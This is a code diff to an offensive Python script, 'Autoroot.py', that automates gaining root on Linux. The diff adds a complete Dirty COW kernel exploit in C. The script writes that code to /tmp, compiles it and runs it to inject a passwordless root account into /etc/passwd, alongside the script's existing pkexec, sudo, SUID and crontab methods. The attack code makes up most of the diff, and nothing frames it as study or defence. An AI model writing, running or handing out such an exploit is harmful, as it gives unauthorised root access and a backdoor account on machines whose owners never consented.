@@ -4,6 +4,10 @@
 # Autoroot.py - Multi-Method Privilege Escalation Script
 # Compatible with Python 2 and 3
 # ============================================================================
+# Author: PrivDayz Team
+# Version: 2025.3
+# Description: Automated root privilege escalation with multiple methods
+# ============================================================================
 
 import os
 import sys
@@ -18,7 +22,7 @@ from datetime import datetime
 # ============================================================================
 # KONFIGURASI
 # ============================================================================
-VERSION = "2025.2"
+VERSION = "2025.3"
 TMP_DIR = "/tmp"
 LOGFILE = "/tmp/autoroot_log.txt"
 OUTPUT_DIR = "/tmp/privdayz_output"
@@ -173,6 +177,65 @@ def exploit_pkexec():
         return True
     return False
 
+def exploit_dirty_cow():
+    log("[*] Attempting Dirty Cow exploit...")
+    
+    dirtycow_code = '''#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/ptrace.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int f;
+void *map;
+pid_t pid;
+pthread_t pth;
+struct stat st;
+
+void *madviseThread(void *arg) {
+    int i, c = 0;
+    for(i = 0; i < 100000000; i++) {
+        c += madvise(map, 100, MADV_DONTNEED);
+    }
+    return NULL;
+}
+
+int main(int argc, char *argv[]) {
+    if(argc < 3) {
+        fprintf(stderr, "Usage: %s /etc/passwd 'user::0:0:root:/root:/bin/bash'\\n", argv[0]);
+        return 1;
+    }
+    f = open(argv[1], O_RDONLY);
+    fstat(f, &st);
+    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
+    pthread_create(&pth, NULL, madviseThread, NULL);
+    int fd = open("/proc/self/mem", O_RDWR);
+    int i, c = 0;
+    for(i = 0; i < 100000000; i++) {
+        lseek(fd, (off_t)map, SEEK_SET);
+        c += write(fd, argv[2], strlen(argv[2]));
+    }
+    return 0;
+}
+'''
+    
+    dirtycow_path = "/tmp/dirtycow.c"
+    write_file(dirtycow_path, dirtycow_code)
+    run_cmd("gcc -pthread {} -o /tmp/dirtycow 2>/dev/null".format(dirtycow_path))
+    
+    if file_exists("/tmp/dirtycow"):
+        log("[+] Dirty Cow compiled successfully!", "INFO")
+        run_cmd("/tmp/dirtycow /etc/passwd 'jue::0:0:root:/root:/bin/bash' 2>/dev/null")
+        return True
+    return False
+
 # ============================================================================
 # MAIN FUNCTIONS
 # ============================================================================
@@ -197,7 +260,6 @@ def escalate():
     
     get_system_info()
     
-    # Try to create output directory
     try:
         os.makedirs(OUTPUT_DIR)
     except:
@@ -208,7 +270,8 @@ def escalate():
         ("pkexec", lambda: True, exploit_pkexec),
         ("sudo", lambda: True, exploit_sudo),
         ("suid_shell", check_suid, create_suid_shell),
-        ("crontab", lambda: True, exploit_crontab)
+        ("crontab", lambda: True, exploit_crontab),
+        ("dirtycow", lambda: True, exploit_dirty_cow)
     ]
     
     success = False
